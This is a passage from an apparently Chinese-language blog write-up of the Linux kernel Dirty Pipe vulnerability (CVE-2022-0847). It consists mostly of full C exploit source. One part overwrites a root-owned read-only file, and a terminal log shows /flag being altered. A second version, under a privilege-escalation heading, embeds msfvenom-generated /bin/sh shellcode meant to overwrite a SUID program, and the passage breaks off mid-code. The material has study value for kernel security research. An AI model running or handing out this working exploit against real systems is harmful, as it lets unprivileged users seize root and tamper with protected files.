</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// exploit now...
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[34m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[*] Start exploiting...</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">     * prepare the pipe, make every pipe_buffer a MERGE flag
</span><span style="color:#65737e;">     * Just write and read through
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[34m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pipe</span><span style="color:#c0c5ce;">(pipe_fd);
</span><span style="color:#c0c5ce;">    pipe_size = </span><span style="color:#8fa1b3;">fcntl</span><span style="color:#c0c5ce;">(pipe_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], F_GETPIPE_SZ);
</span><span style="color:#c0c5ce;">    buffer = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*) </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(page_size);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> size_left = pipe_size; size_left &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; )
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> per_write = size_left &gt; page_size ? page_size : size_left;
</span><span style="color:#c0c5ce;">        size_left -= </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(pipe_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], buffer, per_write);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> size_left = pipe_size; size_left &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; )
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> per_read = size_left &gt; page_size ? page_size : size_left;
</span><span style="color:#c0c5ce;">        size_left -= </span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(pipe_fd[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], buffer, per_read);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] Flag setting has been done.</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">     * Use the splice to make the pipe_buffer-&gt;page
</span><span style="color:#65737e;">     * become the page of the file mapped, by read
</span><span style="color:#65737e;">     * a byte from the file accross the splice
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[34m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[*] Reading a byte from the file by splice.</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    offset_in_file--;   </span><span style="color:#65737e;">// we read a byte, so offset should minus 1
</span><span style="color:#c0c5ce;">    retval = </span><span style="color:#8fa1b3;">splice</span><span style="color:#c0c5ce;">(target_file_fd, &amp;offset_in_file, pipe_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(retval &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">splice failed!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(retval == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">short splice!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] File splice done.</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">     * Now it comes to the time of exploit:
</span><span style="color:#65737e;">     * the mapped page of file has been in pipe_buffer,
</span><span style="color:#65737e;">     * and the PIPE_BUF_FLAG_CAN_MERGE is still set,
</span><span style="color:#65737e;">     * just a simple write can make the exploit.
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    retval = </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(pipe_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], argv[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">], data_size);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(retval &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Write failed!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(retval &lt; data_size)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Short write!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] EXPLOIT DONE!</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>效果：</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">bash-5.2$ uname -a
</span><span style="color:#c0c5ce;">Linux (none) 5.13.19 #1 SMP Sun Jun 15 09:19:10 UTC 2025 x86_64 GNU/Linux
</span><span style="color:#c0c5ce;">bash-5.2$ ls -al /flag 
</span><span style="color:#c0c5ce;">-rw-r--r--    1 root     root            11 Jun 15 09:29 /flag
</span><span style="color:#c0c5ce;">bash-5.2$ cat flag
</span><span style="color:#c0c5ce;">flag{1111}
</span><span style="color:#c0c5ce;">bash-5.2$ echo 1 &gt;flag
</span><span style="color:#c0c5ce;">bash: flag: Permission denied
</span><span style="color:#c0c5ce;">bash-5.2$ /exp /flag 1 AAAA
</span><span style="color:#c0c5ce;">[*] Start exploiting...
</span><span style="color:#c0c5ce;">[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.
</span><span style="color:#c0c5ce;">[+] Flag setting has been done.
</span><span style="color:#c0c5ce;">[*] Reading a byte from the file by splice.
</span><span style="color:#c0c5ce;">[+] File splice done.
</span><span style="color:#c0c5ce;">[+] EXPLOIT DONE!
</span><span style="color:#c0c5ce;">bash-5.2$ cat /flag 
</span><span style="color:#c0c5ce;">fAAAA1111}
</span></pre>
<h2 id="ti-quan">提权</h2><p>修改指定 suid 程序进行提权，使用 msfvenom 生成运行 <code>/bin/sh</code> 的 shellcode：</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;"> * exploit of CVE-2022-0847
</span><span style="color:#65737e;"> * written by arttnba3
</span><span style="color:#65737e;"> */
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/user.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">unsigned char</span><span style="color:#c0c5ce;"> shellcode[] = {
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x7f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x45</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x46</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x02</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x01</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x01</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x02</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x01</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x78</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x38</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x01</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x01</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x07</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x95</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x31</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x69</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x58</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x0f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x05</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x48</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x62</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x69</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x73</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x68</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x00</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x99</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x54</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x52</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5e</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    </span><span style="color:#d08770;">0x6a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3b</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x58</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x0f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x05
</span><span style="color:#c0c5ce;">};
</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> shellcode_len = </span><span style="color:#d08770;">149</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">* </span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[31m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[x] Error : </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, msg);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">envp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;">            page_size;
</span><span style="color:#c0c5ce;">    size_t          offset_in_file;
</span><span style="color:#c0c5ce;">    size_t          data_size;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             target_file_fd;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             pipe_fd[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             pipe_size;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*buffer;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             retval;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// checking before we start to exploit
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(argc &lt; </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Usage: ./exp target_file</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    page_size = </span><span style="color:#8fa1b3;">sysconf</span><span style="color:#c0c5ce;">(_SC_PAGE_SIZE);
</span><span style="color:#c0c5ce;">    offset_in_file = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    target_file_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], O_RDONLY);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(target_file_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Failed to open the target file!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// exploit now...
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[34m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[*] Start exploiting...</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">     * prepare the pipe, make every pipe_buffer a MERGE flag
</span><span style="color:#65737e;">     * Just write and read through
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[34m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pipe</span><span style="color:#c0c5ce;">(pipe_fd);
</span><span style="color:#c0c5ce;">    pipe_size = </span><span style="color:#8fa1b3;">fcntl</span><span style="color:#c0c5ce;">(pipe_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], F_GETPIPE_SZ);
</span><span style="color:#c0c5ce;">    buffer = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*) </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(page_size);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> size_left = pipe_size; size_left &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; )
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> per_write = size_left &gt; page_size ? page_size : size_left;
</span><span style="color:#c0c5ce;">        size_left -= </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(pipe_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], buffer, per_write);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> size_left = pipe_size; size_left &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; )
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> per_read = size_left &gt; page_size ? page_size : size_left;
</span><span style="color:#c0c5ce;">        size_left -= </span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(pipe_fd[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], buffer, per_read);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
